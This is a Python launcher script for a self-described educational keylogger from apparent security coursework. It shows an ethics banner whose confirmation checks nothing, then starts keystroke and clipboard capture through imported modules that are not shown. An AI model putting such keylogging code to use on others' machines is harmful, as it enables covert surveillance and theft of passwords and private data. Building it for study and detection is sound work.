import json
import sys
import os
from pynput import keyboard

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.keylogger_core import EducationalKeylogger
from src.clipboard_logger import ClipboardMonitor

def display_ethics_warning():
    warning = """
    ╔══════════════════════════════════════════════════════════════╗
    ║  ⚠️  EDUCATIONAL USE ONLY - ETHICAL WARNING  ⚠️             ║
    ║                                                              ║
    ║  This tool is designed for:                                 ║
    ║  • Cybersecurity coursework at INSA                         ║
    ║  • Understanding keylogger detection methods                ║
    ║  • Learning encryption and logging techniques               ║
    ║                                                              ║
    ║  Installing on systems without consent is ILLEGAL.          ║
    ║  Unauthorized use violates:                                 ║
    ║  • Computer Fraud and Abuse Act (CFAA)                      ║
    ║  • GDPR / Data protection laws                              ║
    ║  • INSA ethical guidelines                                  ║
    ║                                                              ║
    ║  Press ENTER to confirm you understand and will use         ║
    ║  this ONLY in authorized testing environments.              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(warning)
    input("→ Type 'I UNDERSTAND' and press ENTER: ")
    
def main():
    # Load configuration
    with open('config/config.json', 'r') as f:
        config = json.load(f)
    
    # Initialize keylogger
    keylogger = EducationalKeylogger(config)
    
    # Start clipboard monitoring if enabled
    if config.get('clipboard_logging', True):
        clip_monitor = ClipboardMonitor(keylogger)
        clip_monitor.start()
        print("[+] Clipboard monitoring active")
    
    # Start keylogger with ESC to stop
    print("\n[+] Keylogger running. Press 'ESC' to stop.\n")
    
    def on_press_escape(key):
        if key == keyboard.Key.esc:
            keylogger.stop()
            return False
    
    # Run the keylogger
    try:
        # Start keylogger in separate thread
        import threading
        log_thread = threading.Thread(target=keylogger.start)
        log_thread.daemon = True
        log_thread.start()
        
        # Wait for ESC key
        with keyboard.Listener(on_press=on_press_escape) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        keylogger.stop()
    finally:
        print("\n[+] Logs saved and encrypted")
        print(f"[+] To view logs, use decryption tool")

if __name__ == "__main__":
    display_ethics_warning()
    main()